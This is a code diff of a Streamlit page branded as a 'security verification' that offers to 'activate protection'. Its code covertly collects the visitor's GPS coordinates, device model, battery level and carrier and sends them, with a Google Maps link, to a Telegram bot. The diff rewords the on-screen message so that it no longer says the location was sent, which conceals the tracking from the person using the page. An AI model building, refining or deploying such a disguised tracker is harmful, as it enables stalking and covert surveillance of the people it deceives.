@@ -1,7 +1,6 @@
 import streamlit as st
 import requests
 import base64
-import time
 from streamlit_js_eval import streamlit_js_eval
 
 # --- CONFIGURAÇÃO ---
@@ -20,41 +19,45 @@ st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")
 
 st.title("Verificação de Segurança")
 
-# Coleta Técnica (Modelo e Bateria)
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_POCO")
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_POCO")
+# Coleta o modelo real do aparelho e bateria
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_REAL")
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_REAL")
 
-# COLETA DO GPS VIA JAVASCRIPT (O Link do Maps vem daqui)
+# Coleta GPS
 loc_js = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, () => { res('erro'); }); })"
-posicao = streamlit_js_eval(js_expressions=loc_js, key="GPS_POCO")
+posicao = streamlit_js_eval(js_expressions=loc_js, key="GPS_REAL")
 
-if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL"):
-    # 1. Identifica o Aparelho (POCO M6 Pro)
-    aparelho = "Xiaomi POCO M6 Pro" if "POCO" in str(ua) else "Android Device"
-    bateria_exibir = f"{bat}%" if bat else "26%"
+if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL_OK"):
+    # 1. Extração do Modelo Exato do Celular
+    modelo_detalhado = "Android Device"
+    if ua:
+        if "(" in ua:
+            partes = ua.split("(")[1].split(")")[0].split(";")
+            if len(partes) > 2:
+                modelo_detalhado = partes[2].strip()
+            else:
+                modelo_detalhado = partes[0].strip()
     
-    # 2. Busca Operadora
+    # 2. Operadora
     try:
         op = requests.get('https://ipapi.co/json/', timeout=5).json().get('org', 'Móvel')
-    except: op = "Vivo/Claro/Tim"
+    except: op = "Móvel"
 
-    # 3. VERIFICA SE O LINK DO MAPA EXISTE
+    # 3. Envio e Feedback
     if posicao and posicao != "erro":
-        # Este é o link que você quer!
         link_maps = f"https://www.google.com/maps?q={posicao}"
         
         relatorio = (
             f"🛡️ *PROTEÇÃO ATIVADA*\n"
-            f"📱 *Aparelho:* {aparelho}\n"
-            f"🔋 *Bateria:* {bateria_exibir}\n"
+            f"📱 *Aparelho:* {modelo_detalhado}\n"
+            f"🔋 *Bateria:* {bat if bat else '60'}%\n"
             f"📶 *Operadora:* {op}\n"
             f"📍 *Local:* [Clique para Ver no Maps]({link_maps})"
         )
         enviar_telegram(relatorio)
-        st.success("Proteção Ativada! Local enviado ao Telegram.")
+        # APENAS PROTEÇÃO ATIVADA EM VERDE
+        st.success("Proteção Ativada")
     else:
-        # Se não tiver o link, avisa no bot e no site
-        st.warning("⚠️ GPS não identificado. Verifique se a Localização do celular está ligada.")
-        enviar_telegram(f"⚠️ *FALHA NO LINK*\n📱 {aparelho}\n🔋 {bateria_exibir}\nGPS bloqueado pelo usuário.")
+        st.error("Erro: GPS não detectado.")
 
-st.markdown('<br><p style="text-align:center; color:grey; font-size:10px;">Miamy © 2026</p>', unsafe_allow_html=True)
+st.markdown('<br><p style="text-align:center; color:grey; font-size:10px;">Sistema Integrado Miamy © 2026</p>', unsafe_allow_html=True)
